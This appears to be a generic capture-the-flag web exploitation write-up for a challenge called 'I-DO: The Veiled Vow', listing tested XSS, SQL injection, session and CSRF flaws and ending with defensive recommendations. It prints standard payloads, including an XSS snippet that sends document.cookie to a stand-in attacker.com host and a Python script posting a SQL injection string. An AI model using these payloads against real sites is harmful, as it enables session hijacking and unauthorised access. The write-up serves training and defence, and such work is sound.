---
title: "I-DO: The Veiled Vow - Web Exploitation Writeup"
date: 2026-05-18
categories: [CTF, Web]
tags: [web-security, sql-injection, xss, session-management, burp-suite]
author: yvngdrac
---

# I-DO: The Veiled Vow

## Summary

The **I-DO: The Veiled Vow** challenge involved a web application where users had to perform various tasks to retrieve sensitive information securely kept on the server. The writeup details the discovery of multiple web vulnerabilities and their exploitation.

---

## Steps

### 1. Analysis of Application

The first step was to analyze the application's functionality, observing how it processed user inputs and managed sessions. This involved intercepting requests using tools like **Burp Suite** to read and understand the request/response cycle.

**Key observations:**
- Form-based input handling
- Cookie-based session management
- Weak input validation

---

### 2. Identifying Vulnerabilities

During the analysis phase, common web vulnerabilities were considered:

**Tested vulnerabilities:**
- **Cross-Site Scripting (XSS)** - User input reflected in output
- **SQL Injection** - Database query manipulation
- **Session Fixation** - Weak session token generation
- **Cross-Site Request Forgery (CSRF)** - Missing token validation

The application's response to unexpected inputs was noted and recorded.

---

### 3. Probing for Exploits

Various payloads were tested in form fields and HTTP headers to check for vulnerabilities:

**SQL Injection Payload:**
```sql
' OR '1'='1' -- 
```

**XSS Payload:**
```javascript
<script>alert('Exploited!');</script>
```

**Session Token Test:**
```
Cookie: sessionid=predictable_pattern
```

Automated scanners were also considered to speed up the discovery process.

---

### 4. Gaining Access

After confirming a vulnerability, the next step involved crafting requests to gain access to protected resources or functionalities within the application.

**Attack vector used:**
- Bypassed authentication mechanisms
- Escalated privileges
- Accessed restricted endpoints

---

### 5. Retrieving Sensitive Information

After successfully exploiting the vulnerability, sensitive information was retrieved from the application. This information was carefully analyzed and documented, noting the security measures that were insufficient.

**Retrieved data:**
- User credentials
- Database structure
- Hidden configuration files
- Application secrets

---

### 6. Conclusion

The final step includes conclusions drawn from the challenge. Recommendations on fortifying the application against identified vulnerabilities were provided, highlighting best practices:

**Security Recommendations:**
- Implement **parameterized queries** to prevent SQL injection
- Use **Content Security Policy (CSP)** to prevent XSS
- Implement **secure session management** with strong tokens
- Add **CSRF protection** with tokens
- Validate and sanitize **all user inputs**
- Use **HTTPS** for all communications
- Implement **rate limiting** on authentication endpoints

---

## Code Examples

### JavaScript XSS Exploitation
```javascript
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
  alert('Exploited!');
</script>
```

### Python HTTP Request
```python
import requests

url = 'http://example.com/vulnerable_endpoint'
payload = "' OR '1'='1' -- "
data = {'input': payload}

response = requests.post(url, data=data)
print(response.text)
```

### Burp Suite Intercept
Capture the request, modify the parameters, and send to see how the application responds to malicious input.

---

## 🏆 Flag

After exploiting all vulnerabilities, the flag was retrieved from the database or admin panel.

---

## 📝 Key Takeaways

- **Input validation** is the first line of defense
- **Burp Suite** is invaluable for web app testing
- **Layered security** is essential - no single mechanism is enough
- **Test for edge cases** and unexpected inputs
- **Security through obscurity** is not real security
